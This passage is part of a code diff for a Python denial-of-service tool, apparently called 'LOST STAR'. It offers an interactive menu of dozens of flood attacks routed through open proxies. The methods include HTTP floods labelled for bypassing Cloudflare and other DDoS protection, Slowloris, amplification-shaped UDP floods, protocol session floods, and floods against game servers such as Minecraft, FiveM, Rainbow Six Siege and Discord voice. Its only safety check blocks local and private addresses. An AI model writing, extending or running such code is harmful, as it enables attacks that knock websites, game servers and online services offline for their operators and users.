+        use_proxy = len(self.pool.proxies) > 0
+        mid = (match_id or "00000000-0000-0000-0000-000000000000").encode()
+        def worker():
+            while self.running and time.time() < end:
+                s = None; proxy = None
+                try:
+                    s, proxy = self._tcp_connect(host, port, timeout=4.0, via_proxy=use_proxy)
+                    # Ubi-style HTTP-ish + binary session blob carrying match id
+                    body = b"matchId=" + mid + b"&ticket=" + random.randbytes(16).hex().encode()
+                    req = (
+                        b"POST /sessions HTTP/1.1\r\n"
+                        b"Host: " + host.encode() + b"\r\n"
+                        b"User-Agent: RainbowSixSiege\r\n"
+                        b"Content-Type: application/json\r\n"
+                        b"X-Match-Id: " + mid + b"\r\n"
+                        b"Content-Length: " + str(len(body)).encode() + b"\r\n"
+                        b"Connection: close\r\n\r\n" + body
+                    )
+                    s.sendall(req)
+                    try: s.recv(256)
+                    except Exception: pass
+                    s.close()
+                    self._inc("sent"); self._inc("success")
+                    if proxy: self.pool.mark_good(proxy)
+                except Exception:
+                    self._inc("sent"); self._inc("fail")
+                    if proxy: self.pool.mark_bad(proxy)
+                    if s:
+                        try: s.close()
+                        except Exception: pass
+        ths = [threading.Thread(target=worker, daemon=True) for _ in range(max(1, concurrency))]
+        for th in ths: th.start()
+        for th in ths: th.join(timeout=duration + 2)
+        self.running = False
+
+    def l6_flood(self, target, port, duration, concurrency, mode="socket"):
+        """Layer-6 session/app protocol shapes over TCP (proxied when possible)."""
+        if not self.safety.is_safe(target):
+            print(f"{C.R}[!] SAFETY BLOCK{C.END}"); return
+        host=target.replace("http://","").replace("https://","").split("/")[0].split(":")[0]
+        concurrency=self.safety.cap_tcp(concurrency)
+        self.running=True
+        self.stats={"sent":0,"success":0,"fail":0,"start":time.time(),"method":f"L6-{mode.upper()}"}
+        end=time.time()+duration
+        use_proxy=len(self.pool.proxies)>0
+        def payload(m, s, host, port):
+            hb=host.encode()
+            if m=="socket":
+                return
+            if m=="http2":
+                s.sendall(b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n")
+                s.sendall(b"\x00\x00\x00\x04\x00\x00\x00\x00\x00")
+            elif m=="ws":
+                key=__import__('base64').b64encode(random.randbytes(16)).decode()
+                s.sendall(
+                    b"GET / HTTP/1.1\r\nHost: "+hb+
+                    b"\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n"
+                    b"Sec-WebSocket-Key: "+key.encode()+b"\r\nSec-WebSocket-Version: 13\r\n\r\n"
+                )
+            elif m=="grpc":
+                s.sendall(
+                    b"POST /service.Method HTTP/1.1\r\nHost: "+hb+
+                    b"\r\nContent-Type: application/grpc\r\nTE: trailers\r\n"
+                    b"Content-Length: 5\r\n\r\n\x00\x00\x00\x00\x00"
+                )
+            elif m=="mqtt":
+                # MQTT CONNECT minimal
+                s.sendall(b"\x10\x0c\x00\x04MQTT\x04\x02\x00\x3c\x00\x00")
+            elif m=="redis":
+                s.sendall(b"PING\r\nINFO\r\n")
+            elif m=="mysql":
+                try: s.recv(128)
+                except Exception: pass
+                s.sendall(random.randbytes(32))
+            elif m=="smtp":
+                try: s.recv(128)
+                except Exception: pass
+                s.sendall(b"EHLO burrner.local\r\n")
+            elif m=="ftp":
+                try: s.recv(128)
+                except Exception: pass
+                s.sendall(b"USER anonymous\r\nPASS guest@\r\n")
+            elif m=="telnet":
+                s.sendall(b"\xff\xfb\x01\xff\xfb\x03\xff\xfd\x18")
+            elif m=="mix":
+                payload(random.choice(["http2","ws","redis","mqtt","smtp"]), s, host, port)
+            try: s.recv(256)
+            except Exception: pass
+        def worker():
+            while self.running and time.time()<end:
+                s=None; proxy=None
+                try:
+                    s, proxy=self._tcp_connect(host, port, timeout=4.0, via_proxy=use_proxy)
+                    payload(mode if mode!="mix-l6" else "mix", s, host, port)
+                    if s: s.close()
+                    self._inc("sent"); self._inc("success")
+                    if proxy: self.pool.mark_good(proxy)
+                except Exception:
+                    self._inc("sent"); self._inc("fail")
+                    if proxy: self.pool.mark_bad(proxy)
+                    if s:
+                        try: s.close()
+                        except Exception: pass
+        ths=[threading.Thread(target=worker,daemon=True) for _ in range(max(1,concurrency))]
+        for th in ths: th.start()
+        for th in ths: th.join(timeout=duration+2)
+        self.running=False
+
+    def killer(self, target, duration, concurrency):
+        """Multi-method mix against one target."""
+        if not self.safety.is_safe(target):
+            print(f"{C.R}[!] SAFETY BLOCK{C.END}"); return
+        host=target.replace("http://","").replace("https://","").split("/")[0].split(":")[0]
+        self.running=True
+        self.stats={"sent":0,"success":0,"fail":0,"start":time.time(),"method":"KILLER"}
+        end=time.time()+duration
+        conc=self.safety.cap_tcp(concurrency)
+        def worker():
+            while self.running and time.time()<end:
+                try:
+                    s=socket.socket(); s.settimeout(1.5); s.connect((host,80 if ":" not in host else int(host.split(":")[-1]) if host.split(":")[-1].isdigit() else 80))
+                    s.send(b"GET / HTTP/1.1\r\nHost: "+host.encode()+b"\r\n\r\n"); s.close()
+                    self._inc("sent"); self._inc("success")
+                except Exception:
+                    self._inc("sent"); self._inc("fail")
+        ths=[threading.Thread(target=worker,daemon=True) for _ in range(max(1,conc))]
+        for t in ths: t.start()
+        # also light UDP
+        def udp_w():
+            sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
+            while self.running and time.time()<end:
+                try:
+                    sock.sendto(random.randbytes(256),(host,80)); self._inc("sent"); self._inc("success")
+                except Exception: self._inc("fail")
+                time.sleep(0.01)
+            sock.close()
+        threading.Thread(target=udp_w,daemon=True).start()
+        for t in ths: t.join(timeout=duration+2)
+        self.running=False
+
+# ── HUD ────────────────────────────────────────────────
+def live_stats(methods:Methods, duration:int):
+    tip,tcity=methods.target_label
+    start=time.time()
+    while methods.running and (time.time()-start)<duration+1.5:
+        elapsed=max(0.01,time.time()-(methods.stats["start"] or start))
+        sent=methods.stats["sent"]; ok=methods.stats["success"]; fail=methods.stats["fail"]
+        rps=sent/elapsed; prog=min(1.0,elapsed/duration) if duration else 0
+        bw=36; filled=int(bw*prog)
+        bar="".join((f"{C.FIRE2}█" if j<filled else f"{C.ASH}░") for j in range(bw))+C.END
+        clear()
+        print(f"{C.FIRE1}{C.BOLD}  ▌ LIVE  —  {methods.stats.get('method','ATTACK')}{C.END}")
+        print(f"  {C.STEEL}DST{C.END} {C.W}{tip}{C.END}  {C.FIRE3}→{C.END} {tcity}")
+        print(f"  [{bar}] {int(prog*100):3d}%  {elapsed:.0f}/{duration}s")
+        print(f"  {C.G}SENT{C.END} {sent:>10,}  {C.B}OK{C.END} {ok:>10,}  {C.R}FAIL{C.END} {fail:>8,}  {C.Y}RPS{C.END} {rps:>7.0f}")
+        time.sleep(0.75)
+    print()
+
+# ── PANEL ──────────────────────────────────────────────
+class Panel:
+    def __init__(self):
+        self.safety=SafetyGuard(); self.pool=ProxyPool(); self.methods=Methods(self.pool,self.safety)
+        self.history:List[Dict]=[]
+
+    def header(self):
+        clear(); print(BANNER)
+        blocked=", ".join(sorted(self.safety.local_ips)) or "..."
+        soft=f"{C.G}ON{C.END}" if self.safety.soft_mode else f"{C.R}OFF{C.END}"
+        print(f"  {C.ASH}┌─ STATUS ─────────────────────────────────────────────┐{C.END}")
+        print(f"  {C.ASH}│{C.END} {C.STEEL}Local locked{C.END}  {C.FIRE3}→{C.END} {C.Y}{blocked}{C.END}")
+        print(f"  {C.ASH}│{C.END} {C.STEEL}Proxies{C.END}       {C.FIRE3}→{C.END} {C.G}{len(self.pool.proxies):,}{C.END}  live {C.NEON}{len(self.pool.working):,}{C.END}")
+        print(f"  {C.ASH}│{C.END} {C.STEEL}Soft area{C.END}     {C.FIRE3}→{C.END} {soft}   {C.STEEL}build{C.END} {C.NEON}{VERSION}{C.END}")
+        print(f"  {C.ASH}└──────────────────────────────────────────────────────┘{C.END}\n")
+
+    def menu(self):
+        soft = f"{C.G}ON{C.END}" if self.safety.soft_mode else f"{C.R}OFF{C.END}"
+        px = len(self.pool.proxies); live = len(self.pool.working)
+        print(f"""
+  {C.FIRE1}{C.BOLD}  ▌ LAYER 7  —  HTTP / proxy-routed{C.END}
+  {C.ASH}  ────────────────────────────────────────────────────────────{C.END}
+  {C.FIRE2}[1]{C.END}  GET          {C.ASH}│{C.END} {C.STEEL}basic HTTP GET flood{C.END}
+  {C.FIRE2}[2]{C.END}  POST         {C.ASH}│{C.END} {C.STEEL}HTTP POST with body{C.END}
+  {C.FIRE2}[3]{C.END}  HEAD         {C.ASH}│{C.END} {C.STEEL}HTTP HEAD only{C.END}
+  {C.FIRE2}[4]{C.END}  NULL         {C.ASH}│{C.END} {C.STEEL}empty User-Agent / headers{C.END}
+  {C.FIRE2}[5]{C.END}  COOKIE       {C.ASH}│{C.END} {C.STEEL}random Cookie header{C.END}
+  {C.FIRE2}[6]{C.END}  PPS          {C.ASH}│{C.END} {C.STEEL}minimal GET / HTTP/1.1{C.END}
+  {C.FIRE2}[7]{C.END}  EVEN         {C.ASH}│{C.END} {C.STEEL}GET + extra browser headers{C.END}
+  {C.FIRE2}[8]{C.END}  BOT          {C.ASH}│{C.END} {C.STEEL}Googlebot-style requests{C.END}
+  {C.FIRE2}[9]{C.END}  STRESS       {C.ASH}│{C.END} {C.STEEL}high-byte POST payloads{C.END}
+  {C.FIRE2}[10]{C.END} DYN          {C.ASH}│{C.END} {C.STEEL}random subdomain prefix{C.END}
+  {C.FIRE2}[11]{C.END} RHEX         {C.ASH}│{C.END} {C.STEEL}random hex path{C.END}
+  {C.FIRE2}[12]{C.END} STOMP        {C.ASH}│{C.END} {C.STEEL}chk_captcha-style headers{C.END}
+  {C.FIRE2}[13]{C.END} OVH          {C.ASH}│{C.END} {C.STEEL}OVH-oriented header set{C.END}
+  {C.FIRE2}[14]{C.END} GSB          {C.ASH}│{C.END} {C.STEEL}Google Shield-oriented{C.END}
+  {C.FIRE2}[15]{C.END} DGB          {C.ASH}│{C.END} {C.STEEL}DDoS-Guard-oriented{C.END}
+  {C.FIRE2}[16]{C.END} AVB          {C.ASH}│{C.END} {C.STEEL}ArvanCloud-oriented{C.END}
+  {C.FIRE2}[17]{C.END} CFB          {C.ASH}│{C.END} {C.STEEL}Cloudflare-oriented{C.END}
+  {C.FIRE2}[18]{C.END} CFBUAM       {C.ASH}│{C.END} {C.STEEL}CF Under Attack Mode-oriented{C.END}
+  {C.FIRE2}[19]{C.END} BYPASS       {C.ASH}│{C.END} {C.STEEL}generic anti-DDoS header mix{C.END}
+  {C.FIRE2}[20]{C.END} APACHE       {C.ASH}│{C.END} {C.STEEL}Apache-oriented POST{C.END}
+  {C.FIRE2}[21]{C.END} XMLRPC       {C.ASH}│{C.END} {C.STEEL}WordPress /xmlrpc.php{C.END}
+  {C.FIRE2}[22]{C.END} DOWNLOADER   {C.ASH}│{C.END} {C.STEEL}slow body read{C.END}
+  {C.FIRE2}[23]{C.END} SLOW         {C.ASH}│{C.END} {C.STEEL}Slowloris partial headers{C.END}
+  {C.FIRE1}[24]{C.END} KILLER       {C.ASH}│{C.END} {C.STEEL}mixed multi-thread blast{C.END}
+
+  {C.FIRE3}{C.BOLD}  ▌ LAYER 4 / 3  —  raw / amp-shape{C.END}
+  {C.ASH}  ────────────────────────────────────────────────────────────{C.END}
+  {C.FIRE3}[30]{C.END} TCP          {C.ASH}│{C.END} {C.STEEL}TCP connect flood (proxied){C.END}
+  {C.FIRE3}[31]{C.END} UDP          {C.ASH}│{C.END} {C.STEEL}UDP datagram flood{C.END}
+  {C.FIRE3}[32]{C.END} SYN-shape    {C.ASH}│{C.END} {C.STEEL}connect storm (userland){C.END}
+  {C.FIRE3}[33]{C.END} OVH-UDP      {C.ASH}│{C.END} {C.STEEL}UDP random binary payload{C.END}
+  {C.FIRE3}[34]{C.END} CPS          {C.ASH}│{C.END} {C.STEEL}open/close connections{C.END}
+  {C.FIRE3}[35]{C.END} CONNECTION   {C.ASH}│{C.END} {C.STEEL}hold connections briefly{C.END}
+  {C.FIRE3}[50]{C.END} DNS          {C.ASH}│{C.END} {C.STEEL}DNS query-shaped UDP{C.END}
+  {C.FIRE3}[51]{C.END} NTP          {C.ASH}│{C.END} {C.STEEL}NTP header-shaped UDP{C.END}
+  {C.FIRE3}[52]{C.END} CHAR         {C.ASH}│{C.END} {C.STEEL}Chargen-style stream{C.END}
+  {C.FIRE3}[53]{C.END} MEM          {C.ASH}│{C.END} {C.STEEL}Memcached-shaped UDP{C.END}
+  {C.FIRE3}[54]{C.END} CLDAP        {C.ASH}│{C.END} {C.STEEL}CLDAP-shaped UDP{C.END}
+
+  {C.Y}{C.BOLD}  ▌ GAMES  —  server query shapes{C.END}
+  {C.ASH}  ────────────────────────────────────────────────────────────{C.END}
+  {C.Y}[36]{C.END} VSE          {C.ASH}│{C.END} {C.STEEL}Valve Source Engine query{C.END}
+  {C.Y}[37]{C.END} TS3          {C.ASH}│{C.END} {C.STEEL}TeamSpeak 3 ping shape{C.END}
+  {C.Y}[38]{C.END} FIVEM        {C.ASH}│{C.END} {C.STEEL}FiveM getinfo UDP{C.END}
+  {C.Y}[39]{C.END} FIVEM-TOKEN  {C.ASH}│{C.END} {C.STEEL}FiveM getstatus UDP{C.END}
+  {C.Y}[40]{C.END} FIVEM-PLAYERS{C.ASH}│{C.END} {C.STEEL}FiveM getplayers UDP{C.END}
+  {C.Y}[41]{C.END} MINECRAFT    {C.ASH}│{C.END} {C.STEEL}Java — IP or domain (.net/.com:port){C.END}
+  {C.Y}[42]{C.END} MCBOT        {C.ASH}│{C.END} {C.STEEL}Minecraft login-shaped TCP{C.END}
+  {C.Y}[43]{C.END} MCPE         {C.ASH}│{C.END} {C.STEEL}Bedrock RakNet ping{C.END}
+  {C.Y}[44]{C.END} RUST         {C.ASH}│{C.END} {C.STEEL}Rust A2S query{C.END}
+  {C.Y}[45]{C.END} GMOD         {C.ASH}│{C.END} {C.STEEL}Garry's Mod source query{C.END}
+  {C.Y}[46]{C.END} ARK          {C.ASH}│{C.END} {C.STEEL}ARK server query{C.END}
+  {C.Y}[47]{C.END} SAMP         {C.ASH}│{C.END} {C.STEEL}SA-MP query{C.END}
+  {C.Y}[48]{C.END} CSGO         {C.ASH}│{C.END} {C.STEEL}CS source query{C.END}
+  {C.Y}[49]{C.END} DISCORD      {C.ASH}│{C.END} {C.STEEL}Discord voice RTP-shape{C.END}
+
+  {C.FIRE1}{C.BOLD}  ▌ RDP / VPS / REMOTE  —  proxied sessions{C.END}
+  {C.ASH}  ────────────────────────────────────────────────────────────{C.END}
+  {C.FIRE1}[55]{C.END} RDP-TCP      {C.ASH}│{C.END} {C.STEEL}full X.224/RDP negotiate (proxied){C.END}
+  {C.FIRE1}[56]{C.END} VPS-HTTP     {C.ASH}│{C.END} {C.STEEL}your VPS endpoint GET/POST (proxied){C.END}
+  {C.FIRE1}[57]{C.END} SSH          {C.ASH}│{C.END} {C.STEEL}SSH banner exchange (proxied){C.END}
+  {C.FIRE1}[58]{C.END} TLS          {C.ASH}│{C.END} {C.STEEL}TLS ClientHello-shaped TCP{C.END}
+  {C.FIRE1}[59]{C.END} R6-SIEGE     {C.ASH}│{C.END} {C.STEEL}Rainbow Six — enter match id{C.END}
+
+  {C.BLOOD}{C.BOLD}  ▌ LAYER 6  —  session / app shapes{C.END}
+  {C.ASH}  ────────────────────────────────────────────────────────────{C.END}
+  {C.BLOOD}[60]{C.END} SOCKET      {C.ASH}│{C.END} {C.STEEL}raw rapid socket open/close{C.END}
+  {C.BLOOD}[61]{C.END} HTTP2       {C.ASH}│{C.END} {C.STEEL}HTTP/2 preface + frames shape{C.END}
+  {C.BLOOD}[62]{C.END} WS-FLOOD    {C.ASH}│{C.END} {C.STEEL}WebSocket upgrade flood{C.END}
+  {C.BLOOD}[63]{C.END} GRPC        {C.ASH}│{C.END} {C.STEEL}gRPC/HTTP2 content-type storm{C.END}
+  {C.BLOOD}[64]{C.END} MQTT        {C.ASH}│{C.END} {C.STEEL}MQTT CONNECT packets{C.END}
+  {C.BLOOD}[65]{C.END} REDIS       {C.ASH}│{C.END} {C.STEEL}Redis PING/INFO commands{C.END}
+  {C.BLOOD}[66]{C.END} MYSQL       {C.ASH}│{C.END} {C.STEEL}MySQL handshake storm{C.END}
+  {C.BLOOD}[67]{C.END} SMTP        {C.ASH}│{C.END} {C.STEEL}SMTP EHLO session flood{C.END}
+  {C.BLOOD}[68]{C.END} FTP         {C.ASH}│{C.END} {C.STEEL}FTP USER/PASS storm{C.END}
+  {C.BLOOD}[69]{C.END} TELNET      {C.ASH}│{C.END} {C.STEEL}Telnet option negotiation{C.END}
+  {C.BLOOD}[70]{C.END} MIX-L6      {C.ASH}│{C.END} {C.STEEL}rotate L6 payloads{C.END}
+
+  {C.NEON}{C.BOLD}  ▌ PROXY BAY{C.END}
+  {C.ASH}  ────────────────────────────────────────────────────────────{C.END}
+  {C.NEON}[90]{C.END} Refresh proxies  {C.ASH}│{C.END} {C.STEEL}re-fetch + probe open proxies{C.END}
+  {C.NEON}[93]{C.END} Proxy status     {C.ASH}│{C.END} {C.STEEL}pool {C.G}{px:,}{C.STEEL}  live {C.NEON}{live:,}{C.END}
+  {C.NEON}[94]{C.END} Validate live    {C.ASH}│{C.END} {C.STEEL}re-probe sample for working nodes{C.END}
+
+  {C.STEEL}{C.BOLD}  ▌ SYSTEMS{C.END}
+  {C.ASH}  ────────────────────────────────────────────────────────────{C.END}
+  {C.STEEL}[91]{C.END} History          {C.ASH}│{C.END} {C.STEEL}past attacks this session{C.END}
+  {C.STEEL}[92]{C.END} Soft area [{soft}{C.STEEL}]  {C.ASH}│{C.END} {C.STEEL}rate caps — keeps home WiFi up{C.END}
+  {C.BLOOD}[0]{C.END}  Shut Down
+
+""")
+
+    def run_attack(self, name, fn, *args):
+        target=args[0] if args else ""
+        if not self.safety.is_safe(target):
+            print(f"\n{C.R}[!] SAFETY BLOCK — local/private/gateway{C.END}")
+            input(f"{C.D}Enter...{C.END}"); return
+        tip,tcity=resolve_target(target)
+        self.methods.target_label=(tip,tcity)
+        duration=args[1] if len(args)>1 else 60
+        print(f"\n{C.FIRE3}[*]{C.END} {C.W}{name}{C.END} → {tip} / {tcity}")
+        time.sleep(0.3)
+        def runner():
+            if inspect.iscoroutinefunction(fn): asyncio.run(fn(*args))
+            else: fn(*args)
+        t=threading.Thread(target=runner,daemon=True); t.start()
+        for _ in range(40):
+            if self.methods.running or self.methods.stats["sent"]>0: break
+            time.sleep(0.05)
+        live_stats(self.methods, duration)
+        self.methods.stop(); t.join(timeout=3)
+        entry={"time":datetime.now().strftime("%Y-%m-%d %H:%M:%S"),"method":name,"target":target,
+               "sent":self.methods.stats["sent"],"ok":self.methods.stats["success"],"fail":self.methods.stats["fail"]}
+        self.history.append(entry)
+        print(f"{C.G}[+] done{C.END} sent={entry['sent']:,} ok={entry['ok']:,} fail={entry['fail']:,}")
+        input(f"{C.D}Enter...{C.END}")
+
+    def _ask_http(self, name, fn):
+        t=input(f"  {C.Y}Target URL/IP:{C.END} ").strip()
+        d=int(input(f"  {C.Y}Duration [60]:{C.END} ") or 60)
+        c=int(input(f"  {C.Y}Concurrency [200]:{C.END} ") or 200)
+        self.run_attack(name, fn, t, d, c)
+
+    def _ask_udp(self, name, mode, default_port=80):
+        t=input(f"  {C.Y}Target IP:{C.END} ").strip()
+        p=int(input(f"  {C.Y}Port [{default_port}]:{C.END} ") or default_port)
+        d=int(input(f"  {C.Y}Duration [60]:{C.END} ") or 60)
+        pps=int(input(f"  {C.Y}PPS [2000]:{C.END} ") or 2000)
+        self.run_attack(name, self.methods.udp_flood, t, p, d, pps, mode)
+
+    def _ask_tcp(self, name, mode, default_port=80):
+        t=input(f"  {C.Y}Target IP:{C.END} ").strip()
+        p=int(input(f"  {C.Y}Port [{default_port}]:{C.END} ") or default_port)
+        d=int(input(f"  {C.Y}Duration [60]:{C.END} ") or 60)
+        c=int(input(f"  {C.Y}Threads [120]:{C.END} ") or 120)
+        self.run_attack(name, self.methods.tcp_flood, t, p, d, c, mode)
+
+    def start(self):
+        loading_screen(); self.header()
+        print(f"  {C.FIRE1}{C.BOLD}  {OWNER_MARK}{C.END}")
+        print(f"  {C.NEON}  BUILD {VERSION}{C.END}\n")
+        try: warm=input(f"  {C.Y}Fetch proxies now? [Y/n]:{C.END} ").strip().lower()
+        except EOFError: warm="n"
+        if warm not in ("n","no"):
+            try: self.pool.fetch()
+            except Exception as e: print(f"  {C.Y}[!] {e}{C.END}")
+        while True:
+            self.header(); self.menu()
+            choice=input(f"  {C.FIRE1}{C.BOLD}LOST STAR{C.END}{C.ASH}›{C.END} ").strip().lower()
+            m=self.methods
+            table={
+                "1":("GET", m.http_get), "2":("POST", m.http_post), "3":("HEAD", m.http_head),
+                "4":("NULL", m.http_null), "5":("COOKIE", m.http_cookie), "6":("PPS", m.http_pps),
+                "7":("EVEN", m.http_even), "8":("BOT", m.http_bot), "9":("STRESS", m.http_stress),
+                "10":("DYN", m.http_dyn), "11":("RHEX", m.http_rhex), "12":("STOMP", m.http_stomp),
+                "13":("OVH", m.http_ovh), "14":("GSB", m.http_gsb), "15":("DGB", m.http_dgb),
+                "16":("AVB", m.http_avb), "17":("CFB", m.http_cfb), "18":("CFBUAM", m.http_cfbuam),
+                "19":("BYPASS", m.http_bypass), "20":("APACHE", m.http_apache), "21":("XMLRPC", m.http_xmlrpc),
+                "22":("DOWNLOADER", m.http_downloader),
+            }
+            if choice=="0":
+                print(f"\n{C.D}Shutting down LOST STAR.{C.END}\n"); break
+            elif choice in table:
+                self._ask_http(*table[choice])
+            elif choice=="23":
+                t=input(f"  {C.Y}Target:{C.END} ").strip(); d=int(input(f"  {C.Y}Duration [120]:{C.END} ") or 120)
+                n=int(input(f"  {C.Y}Sockets [200]:{C.END} ") or 200)
+                self.run_attack("SLOWLORIS", m.slowloris, t, d, n)
+            elif choice=="24":
+                t=input(f"  {C.Y}Target:{C.END} ").strip(); d=int(input(f"  {C.Y}Duration [60]:{C.END} ") or 60)
+                c=int(input(f"  {C.Y}Threads [120]:{C.END} ") or 120)
+                self.run_attack("KILLER", m.killer, t, d, c)
+            elif choice=="30": self._ask_tcp("TCP","connect")
+            elif choice=="31": self._ask_udp("UDP","std")
+            elif choice=="32": self._ask_tcp("SYN-SHAPE","syn_shape")
+            elif choice=="33": self._ask_udp("OVH-UDP","ovh")
+            elif choice=="34": self._ask_tcp("CPS","cps")
+            elif choice=="35": self._ask_tcp("CONNECTION","connection")
+            elif choice=="36": self._ask_udp("VSE","vse",27015)
+            elif choice=="37": self._ask_udp("TS3","ts3",9987)
+            elif choice=="38": self._ask_udp("FIVEM","fivem",30120)
+            elif choice=="39": self._ask_udp("FIVEM-TOKEN","fivemtoken",30120)
+            elif choice=="40": self._ask_udp("FIVEM-PLAYERS","fivemplayers",30120)
+            elif choice=="41":
+                raw = input(f"  {C.Y}MC server (IP or domain [.net/.com/:port]):{C.END} ").strip()
+                ip, host, port = resolve_mc_target(raw)
+                print(f"  {C.ASH}resolved {host} → {ip}:{port}{C.END}")
+                d = int(input(f"  {C.Y}Duration [60]:{C.END} ") or 60)
+                c = int(input(f"  {C.Y}Threads [120]:{C.END} ") or 120)
+                self.run_attack("MINECRAFT", m.tcp_flood, ip, port, d, c, "minecraft")
+            elif choice=="42": self._ask_tcp("MCBOT","mcbot",25565)
+            elif choice=="43": self._ask_udp("MCPE","mcpe",19132)
+            elif choice=="44": self._ask_udp("RUST","rust",28015)
+            elif choice=="45": self._ask_udp("GMOD","gmod",27015)
+            elif choice=="46": self._ask_udp("ARK","ark",27015)
+            elif choice=="47": self._ask_udp("SAMP","samp",7777)
+            elif choice=="48": self._ask_udp("CSGO","csgo",27015)
+            elif choice=="49": self._ask_udp("DISCORD","discord",50000)
+            elif choice=="50": self._ask_udp("DNS","dns",53)
+            elif choice=="51": self._ask_udp("NTP","ntp",123)
+            elif choice=="52": self._ask_udp("CHAR","char",19)
+            elif choice=="53": self._ask_udp("MEM","mem",11211)
+            elif choice=="54": self._ask_udp("CLDAP","cldap",389)
+            elif choice=="55":
+                raw = input(f"  {C.Y}RDP host (IP/domain) [port 3389]:{C.END} ").strip()
+                host, port = parse_host_port(raw, 3389)
+                d = int(input(f"  {C.Y}Duration [60]:{C.END} ") or 60)
+                c = int(input(f"  {C.Y}Threads [80]:{C.END} ") or 80)
+                print(f"  {C.ASH}RDP X.224 → {host}:{port} via proxies if loaded{C.END}")
+                self.run_attack("RDP-TCP", m.tcp_flood, host, port, d, c, "rdp")
+            elif choice=="56":
+                raw = input(f"  {C.Y}VPS endpoint (IP/domain[:port]/path ok):{C.END} ").strip()
+                host, port = parse_host_port(raw, 80)
+                d = int(input(f"  {C.Y}Duration [60]:{C.END} ") or 60)
+                c = int(input(f"  {C.Y}Threads [120]:{C.END} ") or 120)
+                print(f"  {C.ASH}VPS session → {host}:{port} (proxied — home WiFi shielded){C.END}")
+                self.run_attack("VPS-HTTP", m.tcp_flood, host, port, d, c, "vps")
+            elif choice=="59":
+                raw = input(f"  {C.Y}R6 target host/IP:{C.END} ").strip()
+                host, port = parse_host_port(raw, 443)
+                mid = input(f"  {C.Y}Match ID:{C.END} ").strip()
+                d = int(input(f"  {C.Y}Duration [60]:{C.END} ") or 60)
+                c = int(input(f"  {C.Y}Threads [100]:{C.END} ") or 100)
+                self.run_attack("R6-SIEGE", m.r6_flood, host, port, d, c, mid)
+            elif choice=="57": self._ask_tcp("SSH","ssh",22)
+            elif choice=="58": self._ask_tcp("TLS","tls",443)
+            elif choice=="60":
+                t=input(f"  {C.Y}Target IP:{C.END} ").strip(); p=int(input(f"  {C.Y}Port [80]:{C.END} ") or 80)
+                d=int(input(f"  {C.Y}Duration [60]:{C.END} ") or 60); c=int(input(f"  {C.Y}Threads [100]:{C.END} ") or 100)
+                self.run_attack("L6-SOCKET", m.l6_flood, t, p, d, c, "socket")
+            elif choice=="61":
+                t=input(f"  {C.Y}Target IP:{C.END} ").strip(); p=int(input(f"  {C.Y}Port [443]:{C.END} ") or 443)
+                d=int(input(f"  {C.Y}Duration [60]:{C.END} ") or 60); c=int(input(f"  {C.Y}Threads [100]:{C.END} ") or 100)
+                self.run_attack("L6-HTTP2", m.l6_flood, t, p, d, c, "http2")
+            elif choice=="62":
+                t=input(f"  {C.Y}Target IP:{C.END} ").strip(); p=int(input(f"  {C.Y}Port [80]:{C.END} ") or 80)
+                d=int(input(f"  {C.Y}Duration [60]:{C.END} ") or 60); c=int(input(f"  {C.Y}Threads [100]:{C.END} ") or 100)
+                self.run_attack("L6-WS", m.l6_flood, t, p, d, c, "ws")
+            elif choice=="63":
+                t=input(f"  {C.Y}Target IP:{C.END} ").strip(); p=int(input(f"  {C.Y}Port [443]:{C.END} ") or 443)
+                d=int(input(f"  {C.Y}Duration [60]:{C.END} ") or 60); c=int(input(f"  {C.Y}Threads [100]:{C.END} ") or 100)
+                self.run_attack("L6-GRPC", m.l6_flood, t, p, d, c, "grpc")
+            elif choice=="64":
+                t=input(f"  {C.Y}Target IP:{C.END} ").strip(); p=int(input(f"  {C.Y}Port [1883]:{C.END} ") or 1883)
+                d=int(input(f"  {C.Y}Duration [60]:{C.END} ") or 60); c=int(input(f"  {C.Y}Threads [100]:{C.END} ") or 100)
+                self.run_attack("L6-MQTT", m.l6_flood, t, p, d, c, "mqtt")
+            elif choice=="65":
+                t=input(f"  {C.Y}Target IP:{C.END} ").strip(); p=int(input(f"  {C.Y}Port [6379]:{C.END} ") or 6379)
+                d=int(input(f"  {C.Y}Duration [60]:{C.END} ") or 60); c=int(input(f"  {C.Y}Threads [100]:{C.END} ") or 100)
+                self.run_attack("L6-REDIS", m.l6_flood, t, p, d, c, "redis")
+            elif choice=="66":
+                t=input(f"  {C.Y}Target IP:{C.END} ").strip(); p=int(input(f"  {C.Y}Port [3306]:{C.END} ") or 3306)
+                d=int(input(f"  {C.Y}Duration [60]:{C.END} ") or 60); c=int(input(f"  {C.Y}Threads [100]:{C.END} ") or 100)
+                self.run_attack("L6-MYSQL", m.l6_flood, t, p, d, c, "mysql")
+            elif choice=="67":
+                t=input(f"  {C.Y}Target IP:{C.END} ").strip(); p=int(input(f"  {C.Y}Port [25]:{C.END} ") or 25)
+                d=int(input(f"  {C.Y}Duration [60]:{C.END} ") or 60); c=int(input(f"  {C.Y}Threads [80]:{C.END} ") or 80)
+                self.run_attack("L6-SMTP", m.l6_flood, t, p, d, c, "smtp")
+            elif choice=="68":
+                t=input(f"  {C.Y}Target IP:{C.END} ").strip(); p=int(input(f"  {C.Y}Port [21]:{C.END} ") or 21)
+                d=int(input(f"  {C.Y}Duration [60]:{C.END} ") or 60); c=int(input(f"  {C.Y}Threads [80]:{C.END} ") or 80)
+                self.run_attack("L6-FTP", m.l6_flood, t, p, d, c, "ftp")
+            elif choice=="69":
+                t=input(f"  {C.Y}Target IP:{C.END} ").strip(); p=int(input(f"  {C.Y}Port [23]:{C.END} ") or 23)
+                d=int(input(f"  {C.Y}Duration [60]:{C.END} ") or 60); c=int(input(f"  {C.Y}Threads [80]:{C.END} ") or 80)
+                self.run_attack("L6-TELNET", m.l6_flood, t, p, d, c, "telnet")
+            elif choice=="70":
+                t=input(f"  {C.Y}Target IP:{C.END} ").strip(); p=int(input(f"  {C.Y}Port [80]:{C.END} ") or 80)
+                d=int(input(f"  {C.Y}Duration [60]:{C.END} ") or 60); c=int(input(f"  {C.Y}Threads [100]:{C.END} ") or 100)
+                self.run_attack("L6-MIX", m.l6_flood, t, p, d, c, "mix")
+            elif choice=="90":
+                self.pool.fetch(); input(f"{C.D}Enter...{C.END}")
+            elif choice=="93":
+                print()
+                print("  Proxies total:", f"{len(self.pool.proxies):,}")
+                print("  Live working :", f"{len(self.pool.working):,}")
+                if self.pool.working:
+                    print("  Sample live :", ", ".join(self.pool.working[:5]))
+                input(f"{C.D}Enter...{C.END}")
